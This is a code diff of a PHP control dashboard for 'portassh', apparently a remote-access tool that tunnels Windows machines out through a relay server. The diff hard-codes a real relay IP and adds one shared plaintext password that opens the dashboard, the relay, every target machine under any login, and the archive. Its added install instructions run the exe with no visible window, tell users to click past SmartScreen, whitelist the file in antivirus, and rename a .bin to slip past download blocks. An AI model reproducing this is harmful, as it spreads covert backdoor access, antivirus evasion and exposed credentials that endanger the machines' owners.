@@ -11,7 +11,7 @@
  */
 $REGISTRY    = '/home/user/web/itstandart.kz/private/portassh-online.txt';
 $EXE         = '/home/user/web/itstandart.kz/private/portassh.exe'; // сборка для скачивания (копируется cron'ом)
-$RELAY       = 'ВАШ_RELAY_IP'; // IP/домен relay-сервера для колонки «Команда подключения»
+$RELAY       = '5.35.81.198'; // IP/домен relay-сервера для колонки «Команда подключения»
 $ACTIVE_SECS = 180;           // heartbeat у exe раз в 60 с — запас ×3
 $MAX_AGE     = 7 * 86400;     // записи старше недели игнорируются вовсе
 
@@ -56,20 +56,33 @@ if (isset($_GET['dl'])) {
 <meta http-equiv="refresh" content="20">
 <title>portassh — активные машины</title>
 <style>
-  body { font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; background: #12151c; color: #e8ecf4; margin: 40px; }
+  body { font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; background: #12151c; color: #f0f4fb; margin: 40px; font-size: 15px; }
   h1 { font-size: 22px; }
   h1 .count { color: #34d399; }
   table { border-collapse: collapse; width: 100%; max-width: 950px; }
   th, td { padding: 10px 14px; text-align: left; border-bottom: 1px solid #2a3040; }
-  th { color: #8fa3c8; font-weight: 600; font-size: 13px; text-transform: uppercase; }
+  th { color: #c3cfe6; font-weight: 700; font-size: 13px; text-transform: uppercase; }
   tr:hover td { background: #1a1f2b; }
   .dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; background: #34d399; margin-right: 8px;
          box-shadow: 0 0 6px #34d399; animation: pulse 2s infinite; }
   @keyframes pulse { 50% { opacity: .5; } }
-  .role-admin { color: #f59e0b; }
-  .role-user  { color: #34d399; }
-  .cmd { font-family: monospace; font-size: 13px; color: #93c5fd; user-select: all; }
-  .empty { color: #8fa3c8; }
+  .role-admin { color: #fbbf24; font-weight: 600; }
+  .role-user  { color: #4ade80; font-weight: 600; }
+  .ago { color: #cbd6ea; font-size: 14px; }
+  .cmd { font-family: Consolas, monospace; font-size: 14px; color: #c9dcfb; user-select: all; }
+  .empty { color: #cbd6ea; font-size: 15px; }
+  a.dl { color: #0f172a; background: #4ade80; padding: 7px 14px; border-radius: 6px; text-decoration: none; font-weight: 700; font-size: 14px; }
+  a.dl:hover { background: #22c55e; }
+  a.dl.blue { background: #60a5fa; }
+  a.dl.blue:hover { background: #3b82f6; }
+  .box { max-width: 950px; margin: 0 0 30px 0; background: #181d28; border: 1px solid #2a3040; border-radius: 8px; padding: 4px 22px 14px 22px; }
+  .box summary { cursor: pointer; font-weight: 700; font-size: 15px; color: #9fe8bf; padding: 10px 0; }
+  .box h2 { font-size: 16px; color: #c3cfe6; margin: 18px 0 8px 0; }
+  .box p, .box li { font-size: 14px; line-height: 1.55; color: #dbe4f5; }
+  .box ol, .box ul { margin: 6px 0 6px 22px; }
+  .pwtab { margin: 8px 0 4px 0; width: auto; }
+  .pwtab td, .pwtab th { border-bottom: 1px solid #2a3040; }
+  .pw { font-family: Consolas, monospace; color: #fbbf24; font-weight: 700; user-select: all; }
 </style>
 </head>
 <body>
@@ -96,8 +109,72 @@ foreach ($lines as $line) {
 $active = array_filter($latest, fn($e) => $sysNow - $e['ts'] <= $ACTIVE_SECS);
 usort($active, fn($a, $b) => $b['ts'] <=> $a['ts']);
 
-echo '<h1>portassh — активные машины: <span class="count">' . count($active) . '</span> <span style="float:right;font-size:14px"><a href="?dl=zip">⬇ .zip (пароль: itstandart)</a> &nbsp; <a href="?dl=bin">⬇ .bin</a></span></h1>';
+echo '<h1>portassh — активные машины: <span class="count">' . count($active) . '</span> <span style="float:right"><a class="dl" href="?dl=zip">⬇ Скачать .zip</a> &nbsp; <a class="dl" style="background:#60a5fa" href="?dl=bin">⬇ .bin</a><div style="text-align:right;color:#cbd6ea;font-size:12px;margin-top:6px">пароль архива и SSH: <b>RtnM91jK.!</b></div></span></h1>';
+
+// ---- Описание и инструкция ----
+$PW = 'RtnM91jK.!';
 ?>
+<div class="box">
+<details open>
+<summary>📖 Что такое portassh и как этим пользоваться — нажмите, чтобы раскрыть/свернуть</summary>
+
+<h2>Что это</h2>
+<p>portassh — инструмент удалённого доступа к компьютерам через SSH-туннель. На целевом
+компьютере запускается <b>portassh.exe</b>: он сам прокладывает туннель через relay-сервер
+(VPS 5.35.81.198) и держит его открытым. Никаких пробросок портов на роутере и настроек
+сети не нужно — машина доступна, пока на ней запущен exe, даже из другой страны.</p>
+<p>Эта страница — пульт дежурного: показывает <b>только активные</b> машины (экземпляр
+portassh подтверждает туннель каждую минуту; машина исчезает из списка через ~3 минуты
+после выключения/закрытия exe). Обновление — каждые 20 секунд.</p>
+
+<h2>Установка на целевом компьютере (Windows)</h2>
+<ol>
+<li>Скачайте <b>portassh.zip</b> кнопкой выше (браузеры не блокируют zip, в отличие от exe).</li>
+<li>Извлеките архив — пароль архива: <span class="pw">RtnM91jK.!</span></li>
+<li>Запустите <span class="cmd">portassh.exe</span>. Окно не появится — это нормально,
+программа работает в фоне.</li>
+<li>Через минуту машина появится в таблице выше. Если SmartScreen предупреждает —
+«Подробнее» → «Выполнить в любом случае». Если антивирус удаляет файл — добавьте
+portassh.exe в доверенные.</li>
+</ol>
+
+<h2>Подключение с другого компьютера (Mac / Linux / Windows с OpenSSH)</h2>
+<p>Найдите нужную машину в таблице выше, скопируйте её команду подключения и выполните в терминале:</p>
+<p class="cmd">ssh -o StrictHostKeyChecking=accept-new -J support@5.35.81.198 -p &lt;ПОРТ&gt; anyuser@localhost</p>
+<p>Подключение попросит пароль <b>два раза</b> — оба раза вводится один и тот же пароль:</p>
+<table class="pwtab">
+<tr><th>Запрос</th><th>Логин</th><th>Пароль</th></tr>
+<tr><td>1. Прыжок через relay-сервер (support@…)</td><td>—</td><td class="pw">RtnM91jK.!</td></tr>
+<tr><td>2. Целевая машина (anyuser@localhost)</td><td>—</td><td class="pw">RtnM91jK.!</td></tr>
+</table>
+<p>После входа вы в командной строке целевого компьютера (через PTY) либо сразу
+выполняете одну команду, дописав её в конец: <span class="cmd">…anyuser@localhost "dir"</span>.</p>
+<p><b>Примечание:</b> на машинах со сборкой до 17:03 пароль цели не спрашивается —
+там вход только по ключу администратора. После обновления на этих машинах начнёт
+действовать единый пароль.</p>
+
+<h2>Единый пароль — шпаргалка</h2>
+<table class="pwtab">
+<tr><th>Где</th><th>Логин</th><th>Пароль</th></tr>
+<tr><td>Страница этого дашборда (basic auth браузера)</td><td>misha8585</td><td class="pw">RtnM91jK.!</td></tr>
+<tr><td>Прыжок через relay (support@5.35.81.198)</td><td>—</td><td class="pw">RtnM91jK.!</td></tr>
+<tr><td>Целевая машина (встроенный SSH-сервер)</td><td>любой</td><td class="pw">RtnM91jK.!</td></tr>
+<tr><td>Zip-архив с этой страницы</td><td>—</td><td class="pw">RtnM91jK.!</td></tr>
+</table>
+
+<h2>Если что-то не работает</h2>
+<ul>
+<li><b>Машина не появляется в списке</b> — exe не запущен или туннель ещё поднимается
+(подождите минуту). Активность в списке = exe работает прямо сейчас.</li>
+<li><b>Connection refused на порту 2200</b> — туннель восстанавливается сам,
+подождите до минуты; если дольше — перезапустите portassh.exe на целевой машине.</li>
+<li><b>Скачивание заблокировано</b> — используйте кнопку «.bin» и переименуйте файл
+обратно в portassh.exe.</li>
+<li><b>Долгое зависание команды</b> — UAC-запросы (контроль учётных записей) ждут
+клика на экране целевой машины; для команд запуска GUI-программ это ожидаемо.</li>
+</ul>
+</details>
+</div>
 <table>
 <tr><th>Машина</th><th>Роль</th><th>Порт</th><th>Команда подключения</th><th>Подтверждение</th></tr>
 <?php
@@ -107,7 +184,7 @@ if (!$active) {
 foreach ($active as $e) {
     $sec = $sysNow - $e['ts'];
     $seen = $sec < 5 ? 'только что' : $sec . ' с назад';
-    $cmd = "ssh -o StrictHostKeyChecking=accept-new -J root@{$GLOBALS['RELAY']} -p {$e['port']} anyuser@localhost";
+    $cmd = "ssh -o StrictHostKeyChecking=accept-new -J support@{$GLOBALS['RELAY']} -p {$e['port']} anyuser@localhost";
     printf(
         "<tr><td><span class=\"dot\"></span>%s</td><td class=\"role-%s\">%s</td><td>%s</td><td class=\"cmd\">%s</td><td class=\"ago\">%s</td></tr>\n",
         htmlspecialchars($e['host']),
